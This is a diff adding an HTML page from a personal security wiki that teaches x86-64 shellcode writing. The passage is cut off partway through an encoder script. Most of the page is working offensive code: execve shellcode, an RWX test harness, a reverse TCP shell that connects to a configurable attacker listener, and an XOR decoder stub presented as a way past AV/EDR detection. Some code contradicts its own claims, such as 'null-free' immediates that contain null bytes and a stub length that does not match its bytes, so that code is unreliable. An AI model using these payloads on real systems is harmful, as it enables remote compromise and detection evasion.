@@ -1,0 +1,1398 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<title>Shellcode | Cookie Engineer's Cyber Wiki</title>
+
+		<!-- Meta -->
+		<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=0.5, maximum-scale=2, user-scalable=yes">
+		<meta name="mobile-web-app-capable" content="yes">
+		<meta name="mobile-web-app-status-bar-style" content="black-translucent">
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="creator" content="Cookie Engineer">
+		<meta name="description" content="Shellcode">
+		<meta name="keywords" content="assembly, execve, exploit-development, nasm, redteam, reverse-shell, shellcode, syscalls">
+		<meta name="generator" content="Cookie Engineer's bare hands with peppermint tea and nightly VIM coding sessions">
+		<meta name="robots" content="index, follow">
+
+		<!-- Social Media -->
+		<meta property="og:title" content="Shellcode">
+		<meta property="og:site_name" content="Cookie Engineer's Wiki">
+		<meta property="og:description" content="Writing position-independent machine code payloads in x86-64 assembly - from first syscall to reverse TCP shell with null-byte avoidance and encoding.">
+		<meta property="og:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+		<meta property="og:url" content="https://cookie.engineer/wiki/articles/redteam/shellcode.md">
+		<meta property="og:type" content="article">
+
+		<!-- Shitter -->
+		<meta name="twitter:card" content="summary">
+		<meta name="twitter:domain" content="cookie.engineer">
+		<meta name="twitter:title" itemprop="name" content="Shellcode">
+		<meta name="twitter:description" itemprop="description" content="Writing position-independent machine code payloads in x86-64 assembly - from first syscall to reverse TCP shell with null-byte avoidance and encoding.">
+		<meta name="twitter:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+
+		<!-- Website Design -->
+		<link rel="stylesheet" href="/design/index.css">
+		<link rel="stylesheet" href="/design/highlight.css">
+		<script type="module" src="/design/index.mjs" defer></script>
+	</head>
+	<body data-layout="article">
+		<header>
+			<div><button data-action="toggle-aside" title="Toggle Sidebar" class="visible"></button><button data-action="toggle-theme" title="Switch Dark/Light Theme"></button><button data-action="toggle-font" title="Switch Dyslexic/Normal Fonts"></button><button data-action="open-website" title="Navigate to Website Index"></button><button data-action="open-wiki" title="Navigate to Wiki Index"></button></div>
+			<div><img src="/design/about/cookiengineer.png" width="32" height="32" /><h1><a href="/wiki/index.html">Cookie Engineer's Cyber Wiki</a></h1></div>
+			<div></div>
+		</header>
+
+		<div>
+		<aside class="visible">
+			<ul class="toc">
+				<li>
+					<b><a href="#overview">Overview</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#required-reading">Required Reading</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#what-shellcode-is">What Shellcode Is</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#the-first-principle-execve2">The First Principle: execve(2)</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#hand-writing-execve-shellcode-in-nasm">Hand-Writing execve Shellcode in NASM</a></b>
+					<ul>
+						<li><a href="#why-this-works-null-byte-audit">Why This Works - Null Byte Audit</a></li>
+						<li><a href="#string-to-immediate-converter">String-to-Immediate Converter</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#extracting-shellcode-bytes">Extracting Shellcode Bytes</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#the-c-test-harness">The C Test Harness</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#reverse-tcp-shell-in-assembly">Reverse TCP Shell in Assembly</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#shellcode-encoding-xor-obfuscation">Shellcode Encoding - XOR Obfuscation</a></b>
+					<ul>
+						<li><a href="#python-xor-encoder">Python XOR Encoder</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#alphanumeric-shellcode">Alphanumeric Shellcode</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#msfvenom-payload-reference">Msfvenom Payload Reference</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#metasploit-multi-handler">Metasploit Multi-Handler</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#the-egg-hunter-pattern">The Egg-Hunter Pattern</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#common-mistakes-when-writing-shellcode">Common Mistakes When Writing Shellcode</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#debugging-shellcode">Debugging Shellcode</a></b>
+					<ul>
+						<li><a href="#strace-trace-syscalls">1. strace - Trace Syscalls</a></li>
+						<li><a href="#gdb-with-int3-breakpoint">2. GDB with int3 Breakpoint</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#architecture-differences">Architecture Differences</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#verification-checklist">Verification Checklist</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#summary-table-shellcode-types">Summary Table - Shellcode Types</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#challenge">Challenge</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#references">References</a></b>
+					<ul>
+					</ul>
+				</li>
+			</ul>
+		</aside>
+
+			<main>
+				<nav aria-label="breadcrumbs">
+					<ol>
+						<li><a href="/wiki/index.html">Wiki</a></li>
+						<li><a href="/wiki/articles/redteam/index.html">Redteam</a></li>
+						<li aria-current="page"><a href="/wiki/articles/redteam/shellcode.html">Shellcode</a></li>
+					</ol>
+				</nav>
+
+				<article>
+					<h2 id="shellcode">Shellcode</h2>
+					<p>
+						Writing position-independent machine code payloads in x86-64 assembly - from first syscall to
+						reverse
+						<abbr title="Transmission Control Protocol">TCP</abbr>
+						shell with null-byte avoidance and encoding.
+					</p>
+					<section>
+						<h3 id="overview">Overview</h3>
+						<p>
+							Shellcode is the raw machine code an exploit runs after it hijacks a process. This article explains
+							what makes a payload position-independent and null-free, shows how to write and extract
+							<code>execve</code>
+							and reverse
+							<abbr title="Transmission Control Protocol">TCP</abbr>
+							shells in x86-64 assembly, and covers encoders,
+							alphanumeric payloads, egg-hunters, and the tools used to verify every byte. By the end you
+							can assemble a payload, extract the opcodes, run it through a harness, and explain what the
+							kernel does when it executes.
+						</p>
+					</section>
+					<section>
+						<h3 id="required-reading">Required Reading</h3>
+						<ul>
+							<li><a href="/wiki/articles/fundamentals/elf.html">ELF</a> - executable format, sections, segments, program headers</li>
+							<li><a href="/wiki/articles/fundamentals/stack.html">Stack</a> - stack layout, stack frames, rsp/rbp mechanics</li>
+							<li><a href="/wiki/articles/fundamentals/calling-conventions.html">Calling Conventions</a> - x86-64 System V ABI, register usage for arguments</li>
+							<li><a href="/wiki/articles/fundamentals/system-calls.html">System Calls</a> - syscall instruction, syscall numbers, register conventions</li>
+							<li><a href="/wiki/articles/fundamentals/buffer-overflows.html">Buffer Overflows</a> - memory corruption fundamentals, control flow hijacking</li>
+						</ul>
+					</section>
+					<section>
+						<h3 id="what-shellcode-is">What Shellcode Is</h3>
+						<p>
+							Shellcode is a string of bytes (opcodes) that represents position-independent machine code.
+							It is the payload delivered by an exploit - injected into a process's address space and executed.
+							The term "shellcode" originates from its original purpose: spawning a shell (/bin/sh). Modern
+							shellcode encompasses any payload: reverse shells, file downloads, privilege escalation stubs,
+							meterpreter stagers.
+						</p>
+						<p>Four properties define well-written shellcode:</p>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Property</th>
+									<th align="center">Why It Matters</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center"><b>Position-independent</b></td>
+									<td align="center">The code cannot assume it lives at any fixed virtual address</td>
+								</tr>
+								<tr>
+									<td align="center"><b>No null bytes</b>(usually)</td>
+									<td align="center">String functions (strcpy, gets) terminate on<code>\x00</code>- your payload stops there</td>
+								</tr>
+								<tr>
+									<td align="center"><b>Small size</b></td>
+									<td align="center">Buffer space is always limited; every byte matters</td>
+								</tr>
+								<tr>
+									<td align="center"><b>Self-contained</b></td>
+									<td align="center">No external library calls - only raw syscalls</td>
+								</tr>
+							</tbody>
+						</table>
+						<p>
+							Position independence means no
+							<code>call</code>
+							to absolute addresses, no
+							<code>jmp</code>
+							to hardcoded locations,
+							and no data references outside the payload body. On x86-64, instruction-pointer-relative addressing
+							solves data access; on x86-32, the classic
+							<code>call/pop</code>
+							trick recovers the instruction pointer.
+						</p>
+						<p>
+							Null-byte avoidance is payload-specific. A
+							<abbr title="Transmission Control Protocol">TCP</abbr>
+							reverse shell
+							payload sent over a socket can contain null bytes. A payload injected through
+							<code>strcpy()</code>
+							in
+							a buffer overflow cannot. Always write shellcode null-free by default - it works in both contexts.
+						</p>
+					</section>
+					<section>
+						<h3 id="the-first-principle-execve2">The First Principle: execve(2)</h3>
+						<p>
+							Every shellcode journey starts with one system call:
+							<code>execve(&#34;/bin/sh&#34;, NULL, NULL)</code>
+							. Here
+							is the man page signature:
+						</p>
+						<pre class="c">
+#include &lt;unistd.h&gt;
+int execve(const char *pathname, char *const _Nullable argv[],
+           char *const _Nullable envp[]);
+						</pre>
+						<p>On x86-64 Linux, the syscall interface is:</p>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Register</th>
+									<th align="center">Role</th>
+									<th align="center">Value for execve</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center"><code>rax</code></td>
+									<td align="center">Syscall number</td>
+									<td align="center">59 (0x3b)</td>
+								</tr>
+								<tr>
+									<td align="center"><code>rdi</code></td>
+									<td align="center">1st argument</td>
+									<td align="center">pointer to<code>&#34;/bin/sh\0&#34;</code></td>
+								</tr>
+								<tr>
+									<td align="center"><code>rsi</code></td>
+									<td align="center">2nd argument</td>
+									<td align="center">pointer to<code>argv</code>array (<code>[ptr_to_string, NULL]</code>) or NULL</td>
+								</tr>
+								<tr>
+									<td align="center"><code>rdx</code></td>
+									<td align="center">3rd argument</td>
+									<td align="center">pointer to<code>envp</code>array or NULL</td>
+								</tr>
+								<tr>
+									<td align="center"><code>syscall</code></td>
+									<td align="center">Instruction</td>
+									<td align="center">Enters kernel mode</td>
+								</tr>
+							</tbody>
+						</table>
+						<p>
+							The kernel looks up
+							<code>rax</code>
+							in the syscall table, copies arguments from registers, validates them,
+							and performs the
+							<code>execve</code>
+							operation - replacing the current process image with
+							<code>/bin/sh</code>
+							.
+						</p>
+					</section>
+					<section>
+						<h3 id="hand-writing-execve-shellcode-in-nasm">Hand-Writing execve Shellcode in NASM</h3>
+						<p>
+							The following assembly spawns
+							<code>/bin/sh</code>
+							with no null bytes. Each instruction is annotated with
+							why it avoids null bytes.
+						</p>
+						<pre class="x86asm">
+; execve.nasm — Null-free execve(&#34;/bin/sh&#34;, NULL, NULL)
+; Assemble: nasm -f elf64 execve.nasm -o execve.o
+; Link:     ld -s execve.o -o execve
+; Extract:  objcopy -O binary execve execve.bin
+; Hexdump:  xxd -i execve.bin
+
+BITS 64
+section .text
+global _start
+
+_start:
+    ; ── Strategy ──
+    ; Push &#34;//bin/sh&#34; + null terminator onto the stack.
+    ; &#34;//bin/sh&#34; is 8 bytes — no null bytes in the string itself.
+    ; The double slash is harmless: //bin/sh resolves identically to /bin/sh.
+    ;
+    ; Null-byte avoidance techniques used:
+    ;   1. xor reg, reg         — zero register without embedding \x00
+    ;   2. push/pop             — avoid mov with 64-bit immediates (which contain zeros)
+    ;   3. mov al, imm8         — set rax low byte without zeroing upper bytes
+    ;      (rax is already zeroed by xor, so upper bytes stay zero)
+    ;   4. cdq / cqo            — sign-extend rax into rdx (rdx = 0 when rax &gt;= 0)
+
+    ; Zero rsi (argv = NULL)
+    xor rsi, rsi
+
+    ; Push null terminator onto stack
+    push rsi                  ; \x00\x00\x00\x00\x00\x00\x00\x00 (rsi = 0)
+
+    ; Push &#34;/bin//sh&#34; (0x68732f2f6e69622f in little-endian)
+    ; In memory: &#39;/&#39; &#39;/&#39; &#39;b&#39; &#39;i&#39; &#39;n&#39; &#39;/&#39; &#39;/&#39; &#39;s&#39; &#39;h&#39;
+    mov rdi, 0x68732f2f6e69622f
+    push rdi
+
+    ; rdi = pointer to the start of &#34;/bin//sh&#34; on stack
+    mov rdi, rsp
+
+    ; Zero rdx (envp = NULL)
+    xor rdx, rdx
+
+    ; Build argv array on stack: [ptr_to_string, NULL]
+    ; argv layout in memory (low to high):
+    ;   [address of &#34;/bin//sh&#34;] [NULL (0)]
+    push rsi                  ; push NULL terminator for argv
+    push rdi                  ; push pointer to &#34;/bin//sh&#34;
+    mov rsi, rsp              ; rsi = pointer to argv array
+
+    ; rax = 59 (execve syscall number)
+    ; Using mov al avoids 64-bit immediate with null bytes
+    xor rax, rax
+    mov al, 59
+
+    syscall
+						</pre>
+						<h4 id="why-this-works-null-byte-audit">Why This Works - Null Byte Audit</h4>
+						<p>
+							<code>xor rsi, rsi</code>
+							encodes as
+							<code>48 31 f6</code>
+							- no
+							<code>\x00</code>
+							.
+							<code>push rsi</code>
+							is
+							<code>56</code>
+							- no
+							<code>\x00</code>
+							.
+							<code>mov rdi, 0x68732f2f6e69622f</code>
+							encodes as
+							<code>48 bf 2f 62 69 6e 2f 2f 73 68</code>
+							- the immediate contains no
+							<code>\x00</code>
+							because we chose
+							a string that packs cleanly into 8 bytes.
+						</p>
+						<p>
+							What if we wrote
+							<code>mov rdi, 0x0068732f6e69622f</code>
+							(with a leading null byte, as "/bin/sh" is 7
+							bytes)? The opcode would contain
+							<code>\x00</code>
+							and the payload would be truncated by any string-based
+							copy.
+						</p>
+						<h4 id="string-to-immediate-converter">String-to-Immediate Converter</h4>
+						<pre class="python">
+#!/usr/bin/env python3
+&#34;&#34;&#34;Convert a string to a little-endian 64-bit hex immediate for nasm.&#34;&#34;&#34;
+
+def string_to_imm(text: str, warn_size: bool = True) -&gt; str:
+    if len(text) &gt; 8:
+        raise ValueError(f&#34;String &#39;{text}&#39; exceeds 8 bytes ({len(text)} bytes)&#34;)
+    if warn_size and len(text) &lt; 8:
+        padded = text + &#39;\x00&#39; * (8 - len(text))
+        print(f&#34;[!] String padded to 8 bytes with nulls — null-byte risk!&#34;)
+        print(f&#34;    Consider padding with &#39;/&#39; instead: &#39;{text}&#39; + &#39;/&#39; * ({8 - len(text)})&#34;)
+    encoded = text.encode(&#39;latin-1&#39;)
+    padded = encoded.ljust(8, b&#39;\x00&#39;)
+    value = int.from_bytes(padded, &#39;little&#39;)
+    return f&#34;0x{value:016x}&#34;
+
+print(string_to_imm(&#34;/bin/sh&#34;))   # WARNING: padded with \x00
+print(string_to_imm(&#34;/bin//sh&#34;))  # Clean: 0x68732f2f6e69622f
+						</pre>
+					</section>
+					<section>
+						<h3 id="extracting-shellcode-bytes">Extracting Shellcode Bytes</h3>
+						<p>The assembly is not shellcode until you strip the ELF wrapper and extract raw opcodes.</p>
+						<pre class="bash">
+# 1. Assemble to ELF object file
+nasm -f elf64 execve.nasm -o execve.o
+
+# 2. Link to ELF executable (strip symbols: -s)
+ld -s execve.o -o execve
+
+# 3. Verify it runs standalone
+./execve
+# You should be in a new /bin/sh process. Exit with Ctrl+D or &#39;exit&#39;.
+
+# 4. Extract raw machine code (position-independent binary blob)
+objcopy -O binary execve execve.bin
+
+# 5. Inspect the bytes
+hd execve.bin
+# Example output:
+# 00000000  48 31 f6 56 48 bf 2f 62  69 6e 2f 2f 73 68 57 48  |H1.VH./bin//shWH|
+# 00000010  89 e7 48 31 d2 56 57 48  89 e6 48 31 c0 b0 3b 0f  |..H1.VWH..H1..;.|
+# 00000020  05                                                |.|
+
+# 6. Generate C array for inclusion in exploit
+xxd -i execve.bin
+# Output:
+# unsigned char execve_bin[] = {
+#   0x48, 0x31, 0xf6, 0x56, 0x48, 0xbf, 0x2f, 0x62, 0x69, 0x6e,
+#   0x2f, 0x2f, 0x73, 0x68, 0x57, 0x48, 0x89, 0xe7, 0x48, 0x31,
+#   0xd2, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x48, 0x31, 0xc0, 0xb0,
+#   0x3b, 0x0f, 0x05
+# };
+# unsigned int execve_bin_len = 33;
+
+# 7. Verify null-byte count
+xxd -p execve.bin | tr -d &#39;\n&#39; | grep -o &#39;00&#39; | wc -l
+# Should output: 0
+						</pre>
+					</section>
+					<section>
+						<h3 id="the-c-test-harness">The C Test Harness</h3>
+						<p>
+							Never embed shellcode directly in a string literal and cast it - modern toolchains put
+							<code>.rodata</code>
+							in non-executable pages. Use
+							<code>mmap</code>
+							with
+							<code>PROT_READ | PROT_WRITE | PROT_EXEC</code>
+							.
+						</p>
+						<pre class="c">
+/*
+ * harness.c — Test shellcode safely with mmap RWX allocation.
+ * Compile: gcc -Wall -Wextra -o harness harness.c
+ * Run:     ./harness
+ */
+
+#define _GNU_SOURCE
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;unistd.h&gt;
+
+/* Paste the xxd -i output here */
+unsigned char payload[] = {
+    0x48, 0x31, 0xf6, 0x56, 0x48, 0xbf, 0x2f, 0x62, 0x69, 0x6e,
+    0x2f, 0x2f, 0x73, 0x68, 0x57, 0x48, 0x89, 0xe7, 0x48, 0x31,
+    0xd2, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x48, 0x31, 0xc0, 0xb0,
+    0x3b, 0x0f, 0x05
+};
+
+int main(void) {
+    size_t payload_len = sizeof(payload);
+    long page_size = sysconf(_SC_PAGESIZE);
+
+    /* Allocate RWX memory via mmap — the only portable way to get
+     * simultaneously writable and executable pages on modern kernels. */
+    void *exec_mem = mmap(
+        NULL,
+        payload_len,
+        PROT_READ | PROT_WRITE | PROT_EXEC,
+        MAP_PRIVATE | MAP_ANONYMOUS,
+        -1,
+        0
+    );
+
+    if (exec_mem == MAP_FAILED) {
+        perror(&#34;mmap&#34;);
+        return EXIT_FAILURE;
+    }
+
+    memcpy(exec_mem, payload, payload_len);
+
+    printf(&#34;[+] Shellcode at %p, length = %zu bytes\n&#34;, exec_mem, payload_len);
+    printf(&#34;[+] Jumping to shellcode...\n&#34;);
+
+    /* Cast shellcode to function pointer and call it */
+    void (*shellcode_fn)(void) = (void (*)(void)) exec_mem;
+    shellcode_fn();
+
+    /* execve replaces the process — this line never executes on success */
+    fprintf(stderr, &#34;[-] execve failed — shell did not spawn\n&#34;);
+    munmap(exec_mem, payload_len);
+    return EXIT_FAILURE;
+}
+						</pre>
+						<pre class="bash">
+# Compile and test
+gcc -Wall -Wextra -o harness harness.c
+./harness
+# Should drop you into /bin/sh. Type &#39;id&#39; to verify.
+
+# Trace syscalls to see what happens
+strace -f ./harness 2&gt;&amp;1 | tail -20
+						</pre>
+					</section>
+					<section>
+						<h3 id="reverse-tcp-shell-in-assembly">Reverse TCP Shell in Assembly</h3>
+						<p>A reverse shell connects back to an attacker-controlled listener. Syscalls involved:</p>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Order</th>
+									<th align="center">Syscall</th>
+									<th align="center">Number</th>
+									<th align="center">Purpose</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center">1</td>
+									<td align="center"><code>socket(2)</code></td>
+									<td align="center">41</td>
+									<td align="center">Create a TCP socket</td>
+								</tr>
+								<tr>
+									<td align="center">2</td>
+									<td align="center"><code>connect(2)</code></td>
+									<td align="center">42</td>
+									<td align="center">Initiate outbound connection to attacker</td>
+								</tr>
+								<tr>
+									<td align="center">3</td>
+									<td align="center"><code>dup2(2)</code>x 3</td>
+									<td align="center">33</td>
+									<td align="center">Redirect stdin, stdout, stderr to socket</td>
+								</tr>
+								<tr>
+									<td align="center">4</td>
+									<td align="center"><code>execve(2)</code></td>
+									<td align="center">59</td>
+									<td align="center">Replace process with shell</td>
+								</tr>
+							</tbody>
+						</table>
+						<p>
+							Each syscall must be position-independent and null-free. The
+							<code>connect</code>
+							syscall requires a
+							<code>sockaddr_in</code>
+							structure containing the attacker's
+							<abbr title="Internet Protocol">IP</abbr>
+							and port. This structure is built
+							on the stack at runtime using
+							<code>push</code>
+							instructions.
+						</p>
+						<pre class="x86asm">
+; reverse-tcp.nasm — Null-free reverse TCP shell, x86-64 Linux
+; Assemble and extract same workflow as execve shellcode.
+;
+; Configuration: change IP_ADDR and PORT before assembling.
+; IP_ADDR: network byte order (big-endian) — 0x0100007f = 127.0.0.1
+; PORT:    network byte order — 0x5c11 = port 4444 (0x115c in host order)
+
+BITS 64
+section .text
+global _start
+
+_start:
+    ; ═══════════════════════════════════════════════════════════
+    ; Step 1: socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
+    ;   int socket(int domain, int type, int protocol);
+    ;   syscall number: 41
+    ;   AF_INET = 2, SOCK_STREAM = 1, IPPROTO_TCP = 0
+    ; ═══════════════════════════════════════════════════════════
+
+    xor rax, rax
+    mov al, 41                ; syscall: socket
+    xor rdi, rdi
+    mov dil, 2                ; domain: AF_INET
+    xor rsi, rsi
+    mov sil, 1                ; type: SOCK_STREAM
+    xor rdx, rdx              ; protocol: 0 (IPPROTO_TCP — default)
+    syscall
+
+    ; Save socket file descriptor in r12 (callee-saved, persists across syscalls)
+    mov r12, rax
+
+    ; ═══════════════════════════════════════════════════════════
+    ; Step 2: Build sockaddr_in on stack and call connect
+    ;   int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
+    ;   syscall number: 42
+    ;
+    ; struct sockaddr_in layout (16 bytes):
+    ;   Offset  Size  Field
+    ;   0       2     sin_family (AF_INET = 2)
+    ;   2       2     sin_port   (network byte order)
+    ;   4       4     sin_addr   (network byte order)
+    ;   8       8     sin_zero   (padding, zeroes)
+    ; ═══════════════════════════════════════════════════════════
+
+    ; Push sockaddr_in onto the stack, building it from high to low addresses
+    xor rax, rax
+    push rax                  ; sin_zero[8] = 0 (padding)
+
+    ; Build the rest using dword and word pushes for compactness
+    ; Layout on stack after pushes (low → high):
+    ;   sin_family (2 bytes) | sin_port (2 bytes) | sin_addr (4 bytes) | sin_zero (8 bytes)
+
+    ; Configure these before assembling:
+    ; IP: 127.0.0.1 = 0x7f000001 in host byte order → 0x0100007f in network byte order
+    ; Port: 4444 = 0x115c in host byte order → 0x5c11 in network byte order
+    ; AF_INET = 0x0002
+
+    mov rax, 0x0100007f       ; sin_addr = 127.0.0.1 (network byte order)
+    push rax
+    push word 0x5c11          ; sin_port = 4444 (network byte order)
+    push word 0x0002          ; sin_family = AF_INET
+
+    mov rsi, rsp              ; rsi = pointer to sockaddr_in
+
+    ; connect(sockfd, &amp;addr, 16)
+    xor rax, rax
+    mov al, 42                ; syscall: connect
+    mov rdi, r12              ; sockfd (saved from socket())
+    ; rsi already set to &amp;addr
+    xor rdx, rdx
+    mov dl, 16                ; addrlen = sizeof(sockaddr_in)
+    syscall
+
+    ; Check connect return: rax should be 0 on success
+    ; Negative value (errno) means connection failed
+
+    ; ═══════════════════════════════════════════════════════════
+    ; Step 3: dup2() — redirect stdin (0), stdout (1), stderr (2) → socket
+    ;   int dup2(int oldfd, int newfd);
+    ;   syscall number: 33
+    ;
+    ; After these calls, anything written to stdout goes through the
+    ; socket, and anything read from stdin comes from the socket.
+    ; The attacker&#39;s listener now has full shell interaction.
+    ; ═══════════════════════════════════════════════════════════
+
+    mov rdi, r12              ; oldfd = sockfd
+
+    xor rax, rax
+    mov al, 33                ; syscall: dup2
+    xor rsi, rsi              ; newfd = 0 (stdin)
+    syscall
+
+    mov al, 33
+    inc rsi                   ; newfd = 1 (stdout)
+    syscall
+
+    mov al, 33
+    inc rsi                   ; newfd = 2 (stderr)
+    syscall
+
+    ; ═══════════════════════════════════════════════════════════
+    ; Step 4: execve(&#34;/bin/sh&#34;, NULL, NULL)
+    ;   Identical to the execve shellcode from before.
+    ; ═══════════════════════════════════════════════════════════
+
+    xor rsi, rsi
+    push rsi
+    mov rdi, 0x68732f2f6e69622f
+    push rdi
+    mov rdi, rsp
+
+    xor rdx, rdx
+    push rsi
+    push rdi
+    mov rsi, rsp
+
+    xor rax, rax
+    mov al, 59                ; syscall: execve
+    syscall
+						</pre>
+						<p>
+							<b>Reverse TCP Configuration Script</b>
+							- change
+							<abbr title="Internet Protocol">IP</abbr>
+							/port without manual hex
+							conversion:
+						</p>
+						<pre class="python">
+#!/usr/bin/env python3
+&#34;&#34;&#34;Generate nasm defines for reverse TCP shell configuration.&#34;&#34;&#34;
+
+import socket
+import sys
+
+def ip_to_hex(ip_str: str) -&gt; str:
+    &#34;&#34;&#34;Convert dotted-quad IP to network-byte-order hex immediate.&#34;&#34;&#34;
+    packed = socket.inet_aton(ip_str)
+    value = int.from_bytes(packed, &#39;big&#39;)
+    return f&#34;0x{value:08x}&#34;
+
+def port_to_hex(port: int) -&gt; str:
+    &#34;&#34;&#34;Convert port number to network-byte-order hex word.&#34;&#34;&#34;
+    value = socket.htons(port)
+    return f&#34;0x{value:04x}&#34;
+
+if __name__ == &#34;__main__&#34;:
+    ip = sys.argv[1] if len(sys.argv) &gt; 1 else &#34;127.0.0.1&#34;
+    port = int(sys.argv[2]) if len(sys.argv) &gt; 2 else 4444
+
+    print(f&#34;%define IP_ADDR  {ip_to_hex(ip)}     ; {ip}&#34;)
+    print(f&#34;%define PORT     {port_to_hex(port)}  ; {port}&#34;)
+						</pre>
+						<pre class="bash">
+# Generate defines and assemble with them
+python3 config.py 10.10.14.5 9001 &gt; config.inc
+nasm -f elf64 -DIP_ADDR=0x$(python3 -c &#34;import socket; print(socket.inet_aton(&#39;10.10.14.5&#39;)[::-1].hex())&#34;) \
+    -DPORT=0x$(python3 -c &#34;import struct; print(struct.pack(&#39;&gt;H&#39;, 9001).hex())&#34;) \
+    reverse-tcp.nasm -o reverse-tcp.o
+						</pre>
+					</section>
+					<section>
+						<h3 id="shellcode-encoding-xor-obfuscation">Shellcode Encoding - XOR Obfuscation</h3>
+						<p>
+							Shellcode encoders transform the payload to bypass signature-based detection (AV/
+							<abbr title="Endpoint Detection and Response">EDR</abbr>
+							) and character restrictions (alphanumeric-only input). The simplest encoder is single-byte
+							XOR.
+						</p>
+						<p>
+							<b>How it works:</b>
+							Choose a key byte
+							<code>K</code>
+							. XOR every byte of the original shellcode with
+							<code>K</code>
+							. The encoded payload contains no recognizable opcodes. The decoder stub is prepended - it loops
+							over the encoded bytes, XORs each with
+							<code>K</code>
+							, and jumps to the decoded payload.
+						</p>
+						<pre class="x86asm">
+; xor-decoder.nasm — Decoder stub prepended to XOR-encoded shellcode.
+; The decoder is self-contained and position-independent.
+;
+; Layout: [decoder stub] [XOR-encoded payload]
+; The decoder computes its own address, finds the encoded payload,
+; decodes it in-place, then jumps to it.
+
+BITS 64
+section .text
+global _start
+
+_start:
+    jmp get_payload_addr     ; Relative jump — no absolute addresses
+
+decoder_start:
+    ; Pop the address of the encoded payload (placed by get_payload_addr)
+    pop rsi                   ; rsi = address of encoded_payload
+
+    ; Decode loop setup
+    xor rcx, rcx
+    mov cl, payload_len       ; number of bytes to decode
+
+decode_loop:
+    xor byte [rsi + rcx - 1], 0xAA   ; XOR each byte with key 0xAA
+    loop decode_loop                  ; ecx--, jump if ecx &gt; 0
+
+    ; Fall through to decoded payload
+    jmp encoded_payload
+
+get_payload_addr:
+    call decoder_start        ; Push address of encoded_payload onto stack
+encoded_payload:
+    ; XOR-encoded shellcode bytes go here
+    ; (original bytes each XORed with 0xAA)
+						</pre>
+						<h4 id="python-xor-encoder">Python XOR Encoder</h4>
+						<pre class="python">
+#!/usr/bin/env python3
+&#34;&#34;&#34;XOR-encode shellcode and wrap it with a decoder stub.&#34;&#34;&#34;
+
+import sys
+import random
+
+def xor_encode(shellcode: bytes, key: int) -&gt; bytes:
+    &#34;&#34;&#34;XOR each byte of shellcode with key.&#34;&#34;&#34;
+    return bytes(b ^ key for b in shellcode)
+
+def generate_decoder_stub(key: int, encoded_len: int) -&gt; bytes:
+    &#34;&#34;&#34;
+    Generate the position-independent XOR decoder stub.
+    This stub must be null-free. The jmp/call/pop pattern
+    recovers the address of the encoded payload.
+    &#34;&#34;&#34;
+    # x86-64 XOR decoder stub (null-free, 30 bytes)
+    # Key is hardcoded into the stub as an immediate byte.
+    stub = bytes([
+        0xEB, 0x0E,                   # jmp short get_payload
+        # decoder_start:
+        0x5E,                         # pop rsi
+        0x48, 0x31, 0xC9,             # xor rcx, rcx
+        0xB1, encoded_len,            # mov cl, encoded_len (max 255 with this stub)
+        # decode_loop:
+        0x80, 0x74, 0x0E, 0xFF, key,  # xor byte [rsi + rcx - 1], key
+        0xE2, 0xF8,                   # loop decode_loop
+        0xFF, 0xE6,                   # jmp rsi
+        # get_payload:
+        0xE8, 0xED, 0xFF, 0xFF, 0xFF, # call decoder_start
+    ])
+    return stub
+
+def main():
+    if len(sys.argv) &lt; 2:
+        print(f&#34;Usage: {sys.argv[0]} &lt;shellcode.bin&gt; [key]&#34;)
+        sys.exit(1)
+
+    with open(sys.argv[1], &#39;rb&#39;) as f:
+        original = f.read()
+
+    key = int(sys.argv[2], 16) if len(sys.argv) &gt; 2 else random.randint(1, 255)
+    print(f&#34;[*] XOR Key: 0x{key:02x}&#34;)
+    print(f&#34;[*] Original length: {len(original)} bytes&#34;)
+
+    encoded = bytes(b ^ key for b in original)
+
+    # Verify no null bytes in encoded payload (decoder stub is already null-free)
+    null_count = encoded.count(0)
+    if null_count &gt; 0:
+        print(f&#34;[!] Encoded payload contains {null_count} null bytes&#34;)
+        print(&#34;[!] Try a different key value&#34;)
+
+    stub = generate_decoder_stub(key, len(original))
+    final = stub + encoded
+
+    print(f&#34;[*] Decoder stub: {len(stub)} bytes&#34;)
